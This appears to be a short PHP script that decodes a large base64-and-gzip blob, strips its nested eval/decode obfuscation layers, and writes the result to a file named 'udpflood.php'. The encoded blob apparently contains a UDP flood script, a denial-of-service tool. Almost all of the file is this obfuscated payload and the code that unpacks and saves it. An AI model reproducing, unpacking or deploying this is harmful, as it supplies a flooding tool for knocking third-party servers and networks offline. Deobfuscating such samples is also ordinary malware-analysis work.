  4      <?php
/*
gl

*/
$str = gzinflate(base64_decode('DZNHkqNIAADv85HpDg4tTGFidrYDCRBOOOEvG5gqrPBOvH77CRmZ+f3vP99DOfz6Bbek/SjOqkNtssCPNJkhTf2Xw6zP4cdvIbfUZlQ1XhQchHDF3z39Ldpx33Lk9Xm78dUoCHeKfilO46tqg21DiEg+BCTz9QW/GD+lMGtThrSmdSEMLbVkzvPt3s0UMS3mDx0WoG2nY+gB2L+fufDyzPU6gNJxAYSarbsanhimzJbUoqZuY0+lV4H6GZtDX9LxkE9L29swfGYibUTtUsoPqIRi7nFBpdmW0t5ECFWjzmfZe2xqERmtMLVpOqnY436BfrDxK10KYOfGAWN7s3geqB7RdV7WkxiBHZU4wyW0LXsmyTdcdwk3TOjduh1F8cyvsgYuaejeLi23csLONsqDsU3gx60zLlm5XQ9jqhbyq949qvb2Us1dqsAGpYvfG3IHY4TxaemBF2mKKY9StKJuDDHxfmI3z+eWa7OwlgvrxeB5Qz4AE2drfLAYmo6litZOUL1GxMlavOlDW8/OMb7ci13dLk1y9XDddGgA4onEBZ0vmx8aSWApy6q2JkpO0i8kg1qOx7EVPgEJNSOLyzZIW8ApDL+V0/0Fstph3qQI+1qQuCwxiZH1aaTMKJItxW5rmz4WyrGmOKCUtLvAU2dle3a85a0GJJQWOGX5AnHiILQpplJ9mdpdQsw9TybO4whCCMqjfgOuSJ+rRT+2Ok8rbc/oVd47v+J02tAy9fkMTP2u8HuUo1Ezp5F3XCMyL6ftJAkw+h+R1ljN0M0NYS/TXCpeY1tyOl7Awe8dP5ygq1VxAFoEKQD6EGdWsWMeBzSruEjIQeRbtgx0oRpw2CnKoxFs/KdiQauXc26QYtLSbeaxiAWLeq784jjWnubV2kpIarL4bMVgNxv+9QwM8j1FvNR1yGa9lVsF1hM63tSpymtn4k1QFEGLVowe93kyhxGbRpNXICoPk3oqbB6DL3chsJ4OwQk4FOIc2k4MQ3tKy/vfv78/Pz///Pr+Gfd/'));


while(preg_match('/eval.*decode\(\'(.*)\'\)/',$str,$ret)){
    $str = gzinflate(base64_decode($ret[1]));
}

file_put_contents("udpflood.php",$str);

?>  